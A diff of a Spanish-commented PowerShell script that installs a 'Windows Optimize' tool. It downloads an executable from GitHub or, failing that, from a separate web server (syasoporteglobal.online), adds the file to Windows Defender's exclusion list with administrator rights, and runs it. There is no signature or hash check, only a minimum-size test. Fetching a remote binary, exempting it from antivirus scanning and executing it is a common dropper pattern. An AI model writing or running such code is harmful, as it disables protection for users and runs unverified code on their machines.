@@ -19,35 +19,95 @@ if (-not (Test-Admin)) {
 # ================= VARIABLES =================
 $owner = "mggons93"
 $repo  = "OptimizeUpdate"
+$fallbackBaseUrl = "https://syasoporteglobal.online/WindowsOptimize"
 
-# ================= OBTENER ÚLTIMA RELEASE =================
-$release = Invoke-RestMethod "https://api.github.com/repos/$owner/$repo/releases/latest"
+# ================= DETECTAR ARQUITECTURA =================
+if ([Environment]::Is64BitOperatingSystem) {
+    $arch = "X64"
+} else {
+    $arch = "x86"
+}
 
-# ================= BUSCAR EL ARCHIVO .EXE =================
-$asset = $release.assets | Where-Object { $_.name -like "*.exe" }
+$fileName = "WindowsOptimizeApp_$arch.exe"
+Write-Output "Sistema detectado: $arch"
 
-if (-not $asset) {
-    Write-Error "No se encontró el ejecutable en la última release"
+# ================= DEFINIR RUTA DE DESCARGA =================
+$exePath = Join-Path -Path $env:USERPROFILE -ChildPath $fileName
+
+# ================= FUNCIÓN DESCARGA =================
+function Download-File($url, $output) {
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction Stop
+        return $true
+    } catch {
+        return $false
+    }
+}
+
+# ================= INTENTO 1: GITHUB =================
+Write-Output "Intentando descarga desde GitHub..."
+
+$downloaded = $false
+
+try {
+    $release = Invoke-RestMethod "https://api.github.com/repos/$owner/$repo/releases/latest" -ErrorAction Stop
+
+    $asset = $release.assets | Where-Object { 
+        $_.name -eq $fileName
+    }
+
+    if ($asset) {
+        $downloaded = Download-File $asset.browser_download_url $exePath
+    } else {
+        Write-Warning "No se encontró el asset en GitHub"
+    }
+
+} catch {
+    Write-Warning "Error accediendo a GitHub"
+}
+
+# ================= FALLBACK: WEB PROPIA =================
+if (-not $downloaded) {
+    Write-Warning "Usando fallback desde servidor web..."
+
+    $fallbackUrl = "$fallbackBaseUrl/$fileName"
+
+    $downloaded = Download-File $fallbackUrl $exePath
+
+    if (-not $downloaded) {
+        Write-Error "Error descargando desde GitHub y fallback web"
+        exit 1
+    }
+}
+
+# ================= VALIDACIÓN BÁSICA =================
+if (-not (Test-Path $exePath)) {
+    Write-Error "El archivo no existe después de la descarga"
     exit 1
 }
 
-# ================= DEFINIR RUTA DE DESCARGA =================
-# Guardar en la carpeta del usuario (C:\Users\[Usuario]\)
-$exePath = Join-Path -Path $env:USERPROFILE -ChildPath $asset.name
-
-Write-Output "Descargando $($asset.name)..."
-Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $exePath -UseBasicParsing
-
-# ================= EXCEPCIÓN PARA WINDOWS DEFENDER =================
-# Esto agrega una excepción para el ejecutable descargado en Windows Defender
-# Requiere permisos de administrador
-try {
-    Add-MpPreference -ExclusionPath $exePath
-    Write-Output "Excepción de Windows Defender añadida para $exePath"
-} catch {
-    Write-Warning "No se pudo agregar la excepción de Windows Defender. Ejecuta manualmente si es necesario."
+$fileSize = (Get-Item $exePath).Length
+if ($fileSize -lt 500000) {
+    Write-Error "Archivo descargado sospechosamente pequeño"
+    exit 1
 }
 
-# ================= EJECUTAR EL PROGRAMA =================
-Write-Output "Ejecutando $($asset.name)..."
-Start-Process -FilePath $exePath
+Write-Output "Descarga completada: $exePath"
+
+# ================= EXCEPCIÓN PARA WINDOWS DEFENDER =================
+try {
+    Add-MpPreference -ExclusionPath $exePath
+    Write-Output "Excepción de Windows Defender añadida"
+} catch {
+    Write-Warning "No se pudo agregar la exclusión"
+}
+
+# ================= EJECUTAR =================
+Write-Output "Ejecutando $fileName..."
+
+try {
+    Start-Process -FilePath $exePath
+} catch {
+    Write-Error "Error al ejecutar el archivo"
+    exit 1
+}
